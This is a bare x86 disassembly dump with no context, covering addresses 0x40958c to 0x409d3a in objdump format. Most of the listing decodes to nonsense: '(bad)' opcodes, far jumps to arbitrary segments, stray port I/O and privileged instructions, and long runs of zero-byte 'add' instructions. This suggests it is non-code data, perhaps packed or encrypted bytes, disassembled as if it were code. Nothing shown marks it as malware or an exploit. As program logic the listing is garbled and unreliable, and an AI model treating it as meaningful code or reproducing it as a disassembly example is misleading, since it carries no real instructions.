  40958c:	xlat   BYTE PTR ds:[ebx]
  40958d:	pop    edx
  40958e:	adc    ecx,edi
  409590:	daa    
  409591:	lahf   
  409592:	call   0x88bf5585
  409597:	rcr    esi,1
  409599:	lock inc esp
  40959b:	(bad)  
  40959c:	jae    0x409547
  40959e:	leave  
  40959f:	inc    ebx
  4095a0:	imul   edx,DWORD PTR [edi-0x41],0x13c071c9
  4095a7:	xchg   edi,eax
  4095a8:	jecxz  0x409556
  4095aa:	lahf   
  4095ab:	dec    ebx
  4095ac:	mov    dl,0x67
  4095ae:	(bad)  
  4095af:	out    0x1,al
  4095b1:	div    edx
  4095b3:	arpl   WORD PTR [eax+0x58],sp
  4095b6:	(bad)  
  4095b7:	jmp    0x27a3:0x9219a529
  4095be:	sub    cl,BYTE PTR [edi+0x2b]
  4095c1:	or     ebp,0x55
  4095c4:	jecxz  0x409584
  4095c6:	mov    bl,0x34
  4095c8:	and    DWORD PTR [ecx+0x8],edx
  4095cb:	add    BYTE PTR [eax],al
  4095cd:	add    BYTE PTR [eax],al
  4095cf:	add    al,al
  4095d1:	mov    dh,0xd7
  4095d3:	sbb    ebp,0x3d
  4095d6:	in     eax,0x13
  4095d8:	pop    ds
  4095d9:	sbb    DWORD PTR [ebx+ebx*1-0x2d4e1548],ebx
  4095e0:	loop   0x4095ab
  4095e2:	cwde   
  4095e3:	lea    edx,[esi+0x4948ea83]
  4095e9:	jle    0x409599
  4095eb:	rcl    BYTE PTR [edx],1
  4095ed:	jo     0x4095aa
  4095ef:	or     ah,cl
  4095f1:	popa   
  4095f2:	retf   
  4095f3:	pop    ebp
  4095f4:	and    edi,0xcaa5102c
  4095fa:	push   edx
  4095fb:	inc    ebx
  4095fc:	push   0x14
  4095fe:	pop    es
  4095ff:	pusha  
  409600:	es clc 
  409602:	inc    ebp
  409603:	lods   al,BYTE PTR ds:[esi]
  409604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409605:	jecxz  0x4095f7
  409607:	and    eax,0xc8eb059a
  40960c:	cmp    ch,BYTE PTR [edx+0x5]
  40960f:	test   ah,dl
  409611:	lahf   
  409612:	push   ds
  409613:	dec    ecx
  409614:	jbe    0x409597
  409616:	scas   eax,DWORD PTR es:[edi]
  409617:	in     eax,dx
  409618:	bswap  eax
  40961a:	clc    
  40961b:	leave  
  40961c:	inc    edx
  40961d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40961e:	leave  
  40961f:	pop    esp
  409620:	push   esp
  409621:	push   edi
  409622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409623:	sub    al,BYTE PTR [eax+eax*1]
  409626:	or     BYTE PTR [ebx-0x39f0d53f],0x4e
  40962d:	add    bh,BYTE PTR [ebp-0x4cea9afc]
  409633:	inc    ecx
  409634:	add    BYTE PTR [eax],al
  409636:	add    BYTE PTR [eax],al
  409638:	add    BYTE PTR [eax],dh
  40963a:	sbb    DWORD PTR [edx*1-0x5817490a],ebx
  409641:	mov    eax,gs
  409643:	repz sub BYTE PTR [edi-0x35],0xa0
  409648:	or     eax,0xdd8b8a7d
  40964d:	dec    eax
  40964e:	fdiv   DWORD PTR [edx-0x58]
  409651:	addr16 (bad) 
  409653:	aam    0x49
  409655:	inc    edx
  409656:	scas   al,BYTE PTR es:[edi]
  409657:	push   ds
  409658:	sbb    al,0xab
  40965a:	test   DWORD PTR [eax+esi*4+0x61c30596],ebx
  409661:	inc    esi
  409662:	cmp    eax,0xa394cb5c
  409667:	ret    
  409668:	fisttp WORD PTR [edi]
  40966a:	addr16 or eax,0xd38e2b5b
  409670:	jno    0x4096c5
  409672:	fs lock cdq 
  409675:	cs pop ebx
  409677:	jno    0x4096f1
  409679:	in     eax,0x9b
  40967b:	ins    DWORD PTR es:[edi],dx
  40967c:	dec    esi
  40967d:	push   cs
  40967e:	xor    DWORD PTR [ebp+0x2c],0x6e
  409682:	call   0xf652:0x370c621c
  409689:	popf   
  40968a:	test   eax,0x600ce915
  40968f:	lods   al,BYTE PTR ds:[esi]
  409690:	or     BYTE PTR [ecx],cl
  409692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409693:	mov    bh,0x9b
  409695:	aad    0x46
  409697:	(bad)  
  409698:	test   BYTE PTR [edx+0x21c338],0x0
  40969f:	add    BYTE PTR [eax],al
  4096a1:	add    bl,al
  4096a3:	into   
  4096a4:	sub    al,0x4b
  4096a6:	lods   eax,DWORD PTR ds:[esi]
  4096a7:	jo     0x409647
  4096a9:	or     eax,0xe4774a
  4096ae:	imul   esi,DWORD PTR [esi+esi*8],0x61
  4096b2:	jbe    0x409711
  4096b4:	adc    al,0x37
  4096b6:	push   cs
  4096b7:	(bad)  
  4096b8:	jbe    0x4096ec
  4096ba:	xchg   edi,eax
  4096bb:	sbb    al,0xa
  4096bd:	ror    BYTE PTR [ebp-0x49929eb2],0x72
  4096c4:	cs ret 
  4096c6:	push   esi
  4096c7:	das    
  4096c8:	loopne 0x4096e5
  4096ca:	test   edi,esp
  4096cc:	push   0x52
  4096ce:	fwait
  4096cf:	out    0x71,eax
  4096d1:	mov    ebp,0xdd504793
  4096d6:	push   edx
  4096d7:	aas    
  4096d8:	inc    eax
  4096d9:	jo     0x4096f4
  4096db:	sar    DWORD PTR [edi+0x4e5521e],0x4f
  4096e2:	arpl   WORD PTR [ebx+0x30],sp
  4096e5:	jge    0x40969a
  4096e7:	fs gs int 0xc3
  4096eb:	call   0xd20a:0x3cd84d14
  4096f2:	jnp    0x409704
  4096f4:	test   DWORD PTR [ecx+0x37],edx
  4096f7:	adc    DWORD PTR [edi],ecx
  4096f9:	adc    eax,DWORD PTR [edx]
  4096fb:	scas   al,BYTE PTR es:[edi]
  4096fc:	jp     0x4096f1
  4096fe:	or     eax,0xa9db25cb
  409703:	out    dx,al
  409704:	xor    edi,DWORD PTR [eax]
  409706:	add    BYTE PTR [eax],al
  409708:	add    BYTE PTR [eax],al
  40970a:	add    BYTE PTR [ecx+0x74],bl
  40970d:	jmp    0x409764
  40970f:	dec    edx
  409710:	ins    BYTE PTR es:[edi],dx
  409711:	mov    BYTE PTR [edi+ecx*1],al
  409714:	mov    ebp,0x9fe682dd
  409719:	inc    ebp
  40971a:	pop    ss
  40971b:	mov    eax,ds:0xb3b17517
  409720:	push   edi
  409721:	adc    eax,0xc41d054b
  409726:	cmp    BYTE PTR [ebp+0x6d],ah
  409729:	aam    0x38
  40972b:	nop
  40972c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40972d:	ret    
  40972e:	jmp    0x409788
  409730:	mov    edi,0x4758fbc3
  409735:	lds    ecx,FWORD PTR [ebx]
  409737:	leave  
  409738:	jge    0x409798
  40973a:	or     BYTE PTR [edx+0x3208c1b2],0xb3
  409741:	dec    eax
  409742:	xor    DWORD PTR [ebx],esi
  409744:	ins    BYTE PTR es:[edi],dx
  409745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409746:	mov    esi,0xc645a83e
  40974b:	test   dl,cl
  40974d:	nop
  40974e:	jl     0x409709
  409750:	add    edx,DWORD PTR [esi-0x3e3a66f5]
  409756:	mov    ecx,DWORD PTR [ecx-0x76643e03]
  40975c:	and    eax,0xdd79abc2
  409761:	sar    DWORD PTR [ebx+0x4ac20579],0x71
  409768:	mov    DWORD PTR [ebx],esp
  40976a:	fadd   QWORD PTR [esp+eax*4+0x89e1]
  409771:	add    BYTE PTR [eax],al
  409773:	add    BYTE PTR [ebp-0x540916d7],ah
  409779:	sub    eax,0xccba3aa7
  40977e:	inc    esp
  40977f:	push   eax
  409780:	xrelease xchg DWORD PTR [edx+eax*1],edi
  409784:	xchg   ecx,eax
  409785:	sbb    eax,0x5ba3bc2
  40978a:	ret    0xaa4b
  40978d:	sbb    eax,0x65aa5bc2
  409792:	ret    0x9a6b
  409795:	jge    0x409759
  409797:	jnp    0x40978f
  409799:	push   edx
  40979a:	sets   BYTE PTR [ebx+0x52616401]
  4097a1:	call   0x5ffdfb2d
  4097a6:	shr    BYTE PTR [ecx+0x554b300],0x26
  4097ad:	out    dx,eax
  4097ae:	das    
  4097af:	sub    eax,0xd4502437
  4097b4:	mov    ds:0x93d401a2,eax
  4097b9:	mov    eax,ds:0xa1a3d4f9
  4097be:	rcl    esp,1
  4097c0:	mov    bl,0xa1
  4097c2:	leave  
  4097c3:	aam    0xc3
  4097c5:	mov    eax,ds:0x67b77c3a
  4097ca:	jmp    0x80021505
  4097cf:	imul   edi,DWORD PTR [edx+0x71],0x27f2fafa
  4097d6:	rol    BYTE PTR ds:0x0,1
  4097dc:	add    BYTE PTR [ebx-0x60],dl
  4097df:	test   al,0x96
  4097e1:	inc    edx
  4097e2:	xchg   DWORD PTR [edx-0x765f0c70],esp
  4097e8:	aam    0x3
  4097ea:	mov    eax,ds:0xa153d461
  4097ef:	mov    ecx,0xb1a143d4
  4097f4:	aam    0x33
  4097f6:	mov    eax,ds:0xa88b4789
  4097fb:	jmp    0x4097ab
  4097fd:	add    bl,dl
  4097ff:	mov    DWORD PTR [ecx],eax
  409801:	inc    ebx
  409802:	clc    
  409803:	je     0x409835
  409805:	add    bh,bl
  409807:	mov    dl,0xde
  40980a:	ins    BYTE PTR es:[edi],dx
  40980b:	aam    0x90
  40980d:	pop    esp
  40980e:	outs   dx,DWORD PTR ds:[esi]
  40980f:	js     0x40982d
  409811:	mov    ds:0x73d5b1a4,al
  409816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409817:	leave  
  409818:	aad    0x63
  40981a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40981b:	rcl    ebp,0x13
  40981e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40981f:	jns    0x4097f6
  409821:	and    esp,DWORD PTR [ecx+edx*2+0xf1d7ad5]
  409828:	mov    al,ds:0xfecfecf2
  40982d:	inc    ebx
  40982e:	push   esp
  40982f:	cmp    edi,DWORD PTR [edi]
  409831:	pushf  
  409832:	int    0x42
  409834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409835:	xor    bh,ah
  409837:	xchg   DWORD PTR [ebp+0x6a629ce8],ebp
  40983d:	jecxz  0x4098a8
  40983f:	pop    edi
  409840:	cmc    
  409841:	add    BYTE PTR [eax],al
  409843:	add    BYTE PTR [eax],al
  409845:	add    BYTE PTR [esi-0x3e],ah
  409848:	cmp    ebx,ebp
  40984a:	pop    esi
  40984b:	xchg   edx,eax
  40984c:	cmp    eax,ebp
  40984e:	data16 mov ds:0xf25ead3b,al
  409854:	cmp    esi,DWORD PTR ds:0x3d360245
  40985a:	cmp    eax,0x454535d2
  40985f:	loop   0x409896
  409861:	dec    ebp
  409862:	cmp    eax,0x65753632
  409867:	inc    edx
  409868:	ss pop ebp
  40986a:	pop    ebp
  40986b:	adc    dh,BYTE PTR [ecx-0x3d]
  40986e:	daa    
  40986f:	out    0xee,eax
  409871:	mov    eax,0xb53c725d
  409876:	inc    ebp
  409877:	cmp    BYTE PTR [edi*4-0x7ac3adc3],0x45
  40987f:	bound  edi,QWORD PTR [ecx*4+0x533ab23d]
  409886:	add    esp,DWORD PTR [ebx-0x31]
  409889:	imul   ebp,DWORD PTR [eax],0xa1f1d20f
  40988f:	daa    
  409890:	xchg   esi,eax
  409891:	pop    ds
  409892:	add    BYTE PTR [edi],cl
  409894:	push   0x54
  409896:	fidivr DWORD PTR [eax-0x39]
  409899:	jle    0x40990a
  40989b:	mov    ebx,0xe1d48bde
  4098a0:	cmp    cl,ch
  4098a2:	(bad)  
  4098a3:	xor    DWORD PTR [ebx],edi
  4098a5:	add    BYTE PTR [ebp-0x7e],al
  4098a8:	pushf  
  4098a9:	xor    al,0x0
  4098ab:	add    BYTE PTR [eax],al
  4098ad:	add    BYTE PTR [eax],al
  4098af:	sub    BYTE PTR gs:[esp+esi*1+0x34bc8315],0x25
  4098b8:	iret   
  4098b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098ba:	dec    bl
  4098bc:	mov    WORD PTR [edx+0xf],es
  4098bf:	adc    BYTE PTR [esi+0x40],0x51
  4098c3:	ja     0x4098e2
  4098c5:	retf   0xfd5a
  4098c8:	rol    DWORD PTR [ecx],0xbb
  4098cb:	inc    eax
  4098cc:	inc    ebx
  4098cd:	dec    esp
  4098ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098cf:	cwde   
  4098d0:	pop    ds
  4098d1:	add    esi,DWORD PTR ds:0x353c6455
  4098d7:	and    eax,0xa5354c64
  4098dc:	gs pop esp
  4098de:	xor    eax,0x356c65a5
  4098e3:	aad    0x65
  4098e5:	icebp  
  4098e6:	jno    0x40988a
  4098e8:	cmp    bl,BYTE PTR [ecx+edi*1-0x151102db]
  4098ef:	push   esp
  4098f0:	jmp    0x9fab:0x9fe959d3
  4098f7:	retf   0x8618
  4098fa:	push   0x24b7d92
  4098ff:	in     eax,0x63
  409901:	in     al,dx
  409902:	xor    eax,0x35fc6415
  409907:	add    eax,0x5360c64
  40990c:	sbb    DWORD PTR [esi+esi*1],0xffffffe5
  409910:	sub    BYTE PTR [ecx+edi*4],0x0
  409914:	add    BYTE PTR [eax],al
  409916:	add    BYTE PTR [eax],al
  409918:	add    DWORD PTR [eax-0x79],edi
  40991b:	cmc    
  40991c:	int    0x7d
  40991e:	mov    al,ds:0x671cbae2
  409923:	in     al,dx
  409924:	clc    
  409925:	xor    DWORD PTR ds:0xf0259048,esi
  40992b:	out    dx,al
  40992c:	outs   dx,DWORD PTR ds:[esi]
  40992d:	repnz (bad) 
  40992f:	jne    0x409962
  409931:	mov    ch,bl
  409933:	xchg   ebx,eax
  409934:	jle    0x40992d
  409936:	frstor [ebx-0x4c21d07a]
  40993c:	jle    0x409905
  40993e:	ffree  st(3)
  409940:	data16 lahf 
  409942:	fst    st(3)
  409944:	pop    esi
  409945:	xor    eax,0x68add8fa
  40994a:	or     BYTE PTR [edx+eax*1],ah
  40994d:	inc    eax
  40994e:	dec    ecx
  40994f:	retf   0x4ae5
  409952:	jmp    0x4c88681
  409957:	push   0x22
  409959:	loope  0x40992b
  40995b:	push   ebx
  40995c:	test   BYTE PTR [eax+ebx*4],al
  40995f:	inc    ebx
  409960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409961:	popf   
  409962:	mov    edi,0xbf959f53
  409967:	arpl   WORD PTR [edi-0x608c4013],sp
  40996d:	in     eax,0xbf
  40996f:	add    DWORD PTR [edi+0x323c5bdd],0x52
  409976:	push   ebp
  409977:	mov    cl,0x4c
  409979:	adc    ch,dh
  40997b:	rol    DWORD PTR [eax],1
  40997d:	add    BYTE PTR [eax],al
  40997f:	add    BYTE PTR [eax],al
  409981:	fbld   TBYTE PTR [edi-0x3a]
  409984:	jmp    0xd72e:0x72303a54
  40998b:	cmp    BYTE PTR [edx-0x466675af],0x5f
  409992:	and    eax,0x5dc803c0
  409997:	les    edx,FWORD PTR [ebx]
  409999:	enter  0xc475,0x23
  40999d:	mov    eax,0xb833c46d
  4099a2:	add    eax,0xb31ccec4
  4099a7:	add    al,0x4e
  4099a9:	jo     0x4099ec
  4099ab:	data16 int3 
  4099ad:	jno    0x40999c
  4099af:	add    al,0x2b
  4099b1:	jbe    0x409951
  4099b3:	out    0x2d,eax
  4099b5:	jb     0x4099f2
  4099b7:	pop    es
  4099b8:	push   ebx
  4099b9:	push   ds
  4099ba:	out    0xc7,al
  4099bc:	push   ebx
  4099bd:	push   eax
  4099be:	test   BYTE PTR [ecx+0x619b03cc],0xcc
  4099c5:	rcr    DWORD PTR [edx-0x653c33c7],cl
  4099cb:	or     ebp,ecx
  4099cd:	stos   DWORD PTR es:[edi],eax
  4099ce:	cdq    
  4099cf:	adc    ebp,ecx
  4099d1:	fwait
  4099d2:	mov    ch,cl
  4099d4:	leave  
  4099d5:	fwait
  4099d6:	xchg   ecx,edx
  4099d8:	leave  
  4099d9:	stos   DWORD PTR es:[edi],eax
  4099da:	xchg   ecx,ecx
  4099dc:	leave  
  4099dd:	stos   DWORD PTR es:[edi],eax
  4099de:	xchg   DWORD PTR [ecx-0x56784437],esi
  4099e4:	leave  
  4099e5:	add    BYTE PTR [eax],al
  4099e7:	add    BYTE PTR [eax],al
  4099e9:	add    bl,bl
  4099eb:	iret   
  4099ec:	fs in  eax,dx
  4099ee:	lea    ecx,[ecx+esi*1]
  4099f1:	retf   0x98eb
  4099f4:	push   ecx
  4099f5:	retf   0x98db
  4099f8:	imul   ecx,ecx,0xc951981b
  4099fe:	sub    ebx,DWORD PTR [eax-0x68143677]
  409a04:	repnz mov bh,0xc4
  409a07:	xor    eax,DWORD PTR [edi-0x12]
  409a0a:	mov    edi,DWORD PTR [esi+0x3a27fc9]
  409a10:	mov    al,ds:0x498d3777
  409a15:	fst    st(5)
  409a17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a18:	and    edx,DWORD PTR [ebp+0xe]
  409a1b:	fwait
  409a1c:	popf   
  409a1d:	sti    
  409a1e:	stos   DWORD PTR es:[edi],eax
  409a1f:	xchg   edi,eax
  409a20:	leave  
  409a21:	retf   0x97ab
  409a24:	push   cs
  409a25:	mov    ebp,0x253396ca
  409a2a:	(bad)  
  409a2c:	xor    edi,DWORD PTR [ebp-0x3acc0926]
  409a32:	push   edi
  409a33:	push   ds
  409a34:	popw   es
  409a36:	test   eax,0x9c2d977d
  409a3b:	sahf   
  409a3c:	pop    esp
  409a3d:	jge    0x409a16
  409a3f:	pop    es
  409a40:	fwait
  409a41:	mov    ds:0x8e6eb9db,eax
  409a46:	out    0xcd,al
  409a48:	fdiv   QWORD PTR ds:0x3d3426e7
  409a4e:	add    BYTE PTR [eax],al
  409a50:	add    BYTE PTR [eax],al
  409a52:	add    dl,bl
  409a54:	jbe    0x409a8a
  409a56:	add    eax,0x1d3446ca
  409a5b:	retf   0x3456
  409a5e:	in     eax,0x57
  409a60:	mov    esi,0x264fdd32
  409a65:	inc    edi
  409a66:	mov    ?,WORD PTR [esi+0x7b]
  409a69:	sub    BYTE PTR [ebp-0x30],bl
  409a6c:	leave  
  409a6d:	pop    eax
  409a6e:	outs   dx,DWORD PTR ds:[esi]
  409a6f:	and    ebp,DWORD PTR [ecx+edx*1]
  409a72:	xchg   ecx,eax
  409a73:	dec    ebp
  409a74:	jmp    0xc1ee85f4
  409a79:	outs   dx,DWORD PTR ds:[esi]
  409a7a:	pushf  
  409a7b:	ins    BYTE PTR es:[edi],dx
  409a7c:	push   esi
  409a7d:	ja     0x409ae4
  409a7f:	pop    eax
  409a80:	xor    ebx,DWORD PTR ds:[ebp+0x58]
  409a84:	xor    eax,DWORD PTR cs:[ebp+0x7d331e48]
  409a8b:	dec    eax
  409a8c:	push   cs
  409a8d:	xor    esp,DWORD PTR [ebp+0x48b87e58]
  409a93:	push   0x8c85b2f2
  409a98:	stc    
  409a99:	jg     0x409a2c
  409a9b:	inc    edi
  409a9c:	in     eax,0xad
  409a9e:	or     ch,ah
  409aa0:	lods   eax,DWORD PTR ds:[esi]
  409aa1:	nop
  409aa2:	add    BYTE PTR [ebx+0x5f],dl
  409aa5:	jl     0x409b25
  409aa7:	cdq    
  409aa8:	inc    edx
  409aa9:	push   cs
  409aaa:	push   ecx
  409aab:	idiv   BYTE PTR [eax+0x34]
  409aae:	cmp    eax,0x3d4479b5
  409ab3:	and    eax,0x3d5479
  409ab8:	add    BYTE PTR [eax],al
  409aba:	add    BYTE PTR [eax],al
  409abc:	aad    0x78
  409abe:	fs cmp eax,0x607478b5
  409ac4:	test   BYTE PTR [esi],al
  409ac6:	mov    eax,ds:0xab61e62c
  409acb:	maxps  xmm6,xmm2
  409ace:	sbb    BYTE PTR [edx-0x5261b342],0xae
  409ad5:	jl     0x409ac0
  409ad7:	scas   eax,DWORD PTR es:[edi]
  409ad8:	jg     0x409aee
  409ada:	pop    ebx
  409adb:	push   ebx
  409adc:	xchg   ebp,eax
  409add:	push   ecx
  409ade:	inc    eax
  409adf:	in     al,0xab
  409ae1:	mov    dl,BYTE PTR [eax]
  409ae3:	mov    ch,0xad
  409ae5:	pop    ebx
  409ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ae7:	mov    ah,0x7c
  409ae9:	and    BYTE PTR [eax-0x1c],bh
  409aec:	mov    dh,BYTE PTR [esi]
  409aee:	lods   eax,DWORD PTR ds:[esi]
  409aef:	or     esp,DWORD PTR [edx+ebp*4]
  409af2:	jl     0x409b0b
  409af4:	jmp    0x2103:0xe4512e93
  409afb:	inc    esp
  409afc:	push   esi
  409afd:	shr    DWORD PTR [ebx+0x6e],1
  409b00:	mov    dl,0x65
  409b02:	retf   0xaea7
  409b05:	adc    BYTE PTR ds:0xd35b9cb,dl
  409b0b:	lods   eax,DWORD PTR ds:[esi]
  409b0c:	sub    DWORD PTR [ebp-0x4af5fff2],esi
  409b12:	push   cs
  409b13:	add    BYTE PTR [edi],cl
  409b15:	xor    cl,BYTE PTR [eax+eax*1-0x2b]
  409b19:	mov    ch,0xe
  409b1b:	add    bl,al
  409b1d:	ror    DWORD PTR [ebx+0x0],1
  409b20:	add    BYTE PTR [eax],al
  409b22:	add    BYTE PTR [eax],al
  409b24:	add    BYTE PTR [eax-0x6ffff402],dl
  409b2a:	gs jno 0x409b70
  409b2d:	nop
  409b2e:	add    DWORD PTR [eax+eax*1],ecx
  409b31:	nop
  409b32:	clc    
  409b33:	jo     0x409b78
  409b35:	nop
  409b36:	add    BYTE PTR [eax+eax*1],cl
  409b39:	nop
  409b3a:	dec    ebx
  409b3b:	jb     0x409b80
  409b3d:	nop
  409b3e:	and    ecx,DWORD PTR [eax+eax*1]
  409b41:	nop
  409b42:	push   edx
  409b43:	jb     0x409b88
  409b45:	nop
  409b46:	xor    cl,BYTE PTR [eax+eax*1]
  409b49:	nop
  409b4a:	bound  esi,QWORD PTR [edx+0x43]
  409b4d:	nop
  409b4e:	and    eax,0xda90000c
  409b53:	mov    eax,DWORD PTR [ebx-0x70]
  409b56:	xor    al,0xc
  409b58:	add    BYTE PTR [eax-0x6fbc741d],dl
  409b5e:	out    0xb,eax
  409b60:	add    BYTE PTR [eax-0x6fbc7400],dl
  409b66:	test   BYTE PTR [ebx],0x0
  409b69:	nop
  409b6a:	call   0xb:0xe790438b
  409b71:	nop
  409b72:	(bad)  [ecx+0x43]
  409b75:	nop
  409b76:	clc    
  409b77:	or     eax,DWORD PTR [eax]
  409b79:	nop
  409b7a:	dec    eax
  409b7b:	jae    0x409bc0
  409b7d:	nop
  409b7e:	sub    DWORD PTR [ebx],ecx
  409b80:	add    BYTE PTR [eax-0x6fbd7bd8],dl
  409b86:	sub    cl,BYTE PTR [ebx]
  409b88:	add    BYTE PTR [eax],al
  409b8a:	add    BYTE PTR [eax],al
  409b8c:	add    BYTE PTR [eax],al
  409b8e:	nop
  409b8f:	or     DWORD PTR [ebx+0xacb9042],eax
  409b95:	add    BYTE PTR [eax-0x6fbd7cee],dl
  409b9b:	int3   
  409b9c:	or     al,BYTE PTR [eax]
  409b9e:	nop
  409b9f:	sub    al,0x8b
  409ba1:	inc    edx
  409ba2:	nop
  409ba3:	mov    dl,0x51
  409ba5:	add    al,0x90
  409ba7:	mov    dl,0x94
  409ba9:	not    DWORD PTR [edi-0x4e]
  409bac:	push   edx
  409bad:	add    al,0x90
  409baf:	mov    dl,0x94
  409bb1:	test   edi,0x90042fb2
  409bb7:	mov    dl,0xc2
  409bb9:	test   DWORD PTR [edx-0x4e],edx
  409bbc:	xor    BYTE PTR [eax+edx*4],al
  409bbf:	mov    dl,0xba
  409bc1:	test   DWORD PTR [edx-0x4e],edx
  409bc4:	lods   eax,DWORD PTR ds:[esi]
  409bc5:	add    al,0x90
  409bc7:	mov    dl,0x6a
  409bc9:	xchg   BYTE PTR [edx-0x4e],dl
  409bcc:	sahf   
  409bcd:	add    al,0x90
  409bcf:	mov    dl,0x77
  409bd1:	xchg   BYTE PTR [edx-0x4e],dl
  409bd4:	mov    eax,DWORD PTR [eax+edx*4]
  409bd7:	mov    dl,0x88
  409bd9:	xchg   BYTE PTR [edx-0x4e],dl
  409bdc:	jl     0x409be2
  409bde:	nop
  409bdf:	mov    dl,0xa2
  409be1:	xchg   BYTE PTR [edx-0x4e],dl
  409be4:	imul   eax,DWORD PTR [eax+edx*4],0x52876bb2
  409beb:	mov    dl,0x5a
  409bed:	add    al,0x90
  409bef:	mov    dl,0x29
  409bf1:	xchg   DWORD PTR [eax],eax
  409bf3:	add    BYTE PTR [eax],al
  409bf5:	add    BYTE PTR [eax],al
  409bf7:	shl    BYTE PTR [edx-0x4d17fc8c],cl
  409bfd:	mov    al,BYTE PTR [ebx]
  409bff:	in     al,0xb2
  409c01:	mov    DWORD PTR [ebx],eax
  409c03:	mov    ds:0xb603b3b2,eax
  409c08:	mov    dl,0x41
  409c0a:	add    al,0xec
  409c0c:	mov    dl,0x41
  409c0e:	add    al,0x90
  409c10:	mov    dl,0x34
  409c12:	dec    esp
  409c13:	xlat   BYTE PTR ds:[ebx]
  409c14:	aad    0x59
  409c16:	dec    edi
  409c17:	mov    dh,0xdf
  409c19:	xor    BYTE PTR [edx-0x2a],dh
  409c1c:	fild   WORD PTR [ecx+0x68]
  409c1f:	lods   eax,DWORD PTR ds:[esi]
  409c20:	les    ecx,FWORD PTR [esi]
  409c22:	sbb    DWORD PTR [ebp-0x6c16993a],esi
  409c28:	mov    dl,0xe
  409c2a:	hlt    
  409c2b:	lea    esi,[edx-0x4d8c1cf2]
  409c31:	push   cs
  409c32:	in     al,0x93
  409c34:	mov    dl,0xe
  409c36:	mov    ah,0xc9
  409c38:	icebp  
  409c39:	push   cs
  409c3a:	retf   0xf490
  409c3d:	push   cs
  409c3e:	jecxz  0x409bfa
  409c40:	icebp  
  409c41:	push   cs
  409c42:	jmp    FWORD PTR [edx-0x567bf10f]
  409c48:	icebp  
  409c49:	push   cs
  409c4a:	or     dl,BYTE PTR [ecx-0x66c1f10c]
  409c50:	icebp  
  409c51:	push   cs
  409c52:	inc    edx
  409c53:	mov    dh,cl
  409c55:	push   cs
  409c56:	pop    ss
  409c57:	xchg   cl,dh
  409c59:	push   cs
  409c5a:	outs   dx,DWORD PTR ds:[esi]
  409c5b:	add    BYTE PTR [eax],al
  409c5d:	add    BYTE PTR [eax],al
  409c5f:	add    BYTE PTR [ebx-0xf],bh
  409c62:	push   cs
  409c63:	cmp    DWORD PTR [ecx-0xf],0xe
  409c67:	jl     0x409cd2
  409c69:	icebp  
  409c6a:	push   cs
  409c6b:	std    
  409c6c:	data16 icebp 
  409c6e:	push   cs
  409c6f:	cli    
  409c70:	dec    esp
  409c71:	icebp  
  409c72:	push   cs
  409c73:	fiadd  WORD PTR [ecx+esi*8+0xe]
  409c77:	mov    ebp,ebx
  409c79:	repz push cs
  409c7b:	sbb    edx,ebp
  409c7d:	repz push cs
  409c7f:	ror    esi,cl
  409c81:	repz push cs
  409c83:	imul   eax,esi,0xdfcf0ef3
  409c89:	repz push cs
  409c8b:	call   0xe194:0x5a0ecb93
  409c92:	push   cs
  409c93:	push   ecx
  409c94:	mov    ebx,ss
  409c96:	push   cs
  409c97:	dec    ebp
  409c98:	xchg   esp,eax
  409c99:	fisttp QWORD PTR [esi]
  409c9b:	push   esi
  409c9c:	mov    WORD PTR [edx-0x4975fff2],?
  409ca2:	cmp    eax,DWORD PTR [eax]
  409ca4:	cmp    esi,DWORD PTR [edx-0x4dd0ffc9]
  409caa:	add    BYTE PTR ss:[ecx],bh
  409cad:	mov    dl,0xe
  409caf:	add    BYTE PTR [edx-0x4a],ch
  409cb2:	pop    edi
  409cb3:	add    BYTE PTR [edi-0x69ff844a],al
  409cb9:	mov    dh,0x62
  409cbb:	add    BYTE PTR [esi+esi*4-0x495fffa9],cl
  409cc2:	pusha  
  409cc3:	add    BYTE PTR [eax],al
  409cc5:	add    BYTE PTR [eax],al
  409cc7:	add    BYTE PTR [eax],al
  409cc9:	lea    esi,[esi-0x4e11ffa1]
  409ccf:	dec    ebx
  409cd0:	add    ch,ah
  409cd2:	mov    cl,0x6d
  409cd4:	add    BYTE PTR [edx-0x16ff844f],bh
  409cda:	mov    cl,0xe
  409cdc:	add    dl,bh
  409cde:	mov    cl,0x65
  409ce0:	add    dl,bl
  409ce2:	mov    cl,0x69
  409ce4:	add    bl,bh
  409ce6:	mov    cl,0x5f
  409ce8:	add    BYTE PTR [edx+esi*4],bl
  409ceb:	inc    ebp
  409cec:	add    BYTE PTR [esi],cl
  409cee:	mov    dl,0x60
  409cf0:	add    ch,cl
  409cf2:	mov    cl,0x48
  409cf4:	add    bl,bh
  409cf6:	mov    cl,0x6d
  409cf8:	add    BYTE PTR [edx+esi*4],al
  409cfb:	imul   eax,DWORD PTR [eax],0xeb179
  409d01:	and    al,0xb1
  409d03:	dec    edx
  409d04:	add    BYTE PTR [eax-0x4f],al
  409d07:	dec    ebx
  409d08:	add    BYTE PTR ds:0x1c0065b1,al
  409d0e:	mov    cl,0x60
  409d10:	add    ch,bl
  409d12:	mov    cl,0xe
  409d14:	add    BYTE PTR [edx-0x45ff8a4a],bl
  409d1a:	mov    dh,0x42
  409d1c:	add    BYTE PTR [eax-0x6f8cf50e],dl
  409d22:	out    0xa,eax
  409d24:	push   esi
  409d25:	nop
  409d26:	loop   0x409d32
  409d28:	gs nop
  409d2a:	test   BYTE PTR [edx],cl
  409d2c:	xor    eax,DWORD PTR [eax]
  409d2e:	add    BYTE PTR [eax],al
  409d30:	add    BYTE PTR [eax],al
  409d32:	nop
  409d33:	dec    ecx
  409d34:	or     al,0x0
  409d36:	nop
  409d37:	xchg   ebp,eax
  409d38:	inc    ebx
  409d39:	pop    eax
  409d3a:	int    0x9e
